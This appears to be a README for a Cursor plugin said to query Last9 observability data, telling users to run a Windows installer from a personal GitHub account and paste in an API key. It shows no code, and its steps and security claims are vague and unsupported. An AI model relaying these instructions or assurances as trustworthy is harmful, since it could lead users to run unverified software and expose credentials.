# 🔍 cursor-plugin - Query your production stack within Cursor

[![Download cursor-plugin](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Christianly-bar1265/cursor-plugin)

This application connects your production data directly to the Cursor code editor. You see logs, metrics, and alerts without leaving your workspace. It uses the Last9 platform to fetch information about your servers and services.

## 📋 What this tool does

Modern software runs on many layers. You have logs that record events, metrics that track performance, and traces that follow user requests. Usually, you check these items in a web browser. This tool brings those details into your editor. You ask questions about your system health while you write code.

## ⚙️ System Requirements

- Windows 10 or Windows 11
- At least 4GB of RAM
- An active Cursor editor installation
- A Last9 account for data access

## ⬇️ How to get started

1. Visit this page to download: [https://github.com/Christianly-bar1265/cursor-plugin](https://github.com/Christianly-bar1265/cursor-plugin)
2. Locate the download button on the page.
3. Save the installer file to your computer.
4. Run the installer file by double-clicking it.
5. Follow the prompts on the screen to complete the setup.
6. Open your Cursor editor after the installation finishes.

## 🔑 Linking your account

The plugin needs permission to read your system data. You provide these permissions through an authentication key.

1. Log in to your Last9 dashboard in your web browser.
2. Find the settings menu.
3. Generate a new API key.
4. Copy this key to your clipboard.
5. Open the command palette in Cursor.
6. Type the command for this plugin.
7. Paste your key when the input box appears.
8. Press Enter to save your settings.

## 🛠 Features

### Logs
Search through your system records. Filter by time or error level to find the root cause of a problem.

### Metrics
View live graphs for server usage. Monitor CPU, memory, and disk health in real time.

### Traces
Follow a user request through your services. See exactly which step takes the most time.

### Alerts
Receive notifications when something goes wrong. The plugin displays active alerts so you fix issues before users report them.

## 🧩 How to use the interface

Once you authorize the plugin, a new icon appears in your Cursor sidebar. Click this icon to open the main window. 

The search bar sits at the top of this window. Type your query in plain English. For example, you might type "Show me the error logs from the last hour." The plugin processes your request and displays the results in the pane below.

You can pin specific windows or metrics to your sidebar. This keeps important data visible while you focus on writing code. 

## 🛡 Security

The plugin communicates only with your instances of Last9. It does not send your source code to external servers. Your API key stays stored locally on your machine. You control the connection at all times. If you remove the plugin, all saved credentials disappear from your system.

## 💡 Solving common problems

If you do not see data, check your internet connection first. Ensure your API key remains valid and has not expired. Sometimes, large datasets take a few moments to load.

If the plugin does not respond, restart your Cursor editor. This forces a fresh connection to the Last9 system.

If you encounter errors during installation, verify that you possess the latest version of Windows. Outdated systems sometimes block new connections.

## 📝 Configuration options

Access the settings menu to adjust how the plugin displays data. You choose which services to monitor if you manage more than one. You also set the automatic refresh rate for metrics. A shorter refresh rate provides newer details but uses more system resources.

## 🌐 Topics covered

- Alerts: Notifications for system failures.
- APM: Application performance monitoring for your code.
- Cursor: The editor where this plugin lives.
- Last9: The platform providing your data.
- Logs: Text files tracking system behavior.
- MCP: The communication protocol used for data.
- Metrics: Numerical data about system health.
- Observability: The ability to understand your system state.
- OpenTelemetry: The standard for collecting performance data.
- Traces: Maps of how requests move through your software.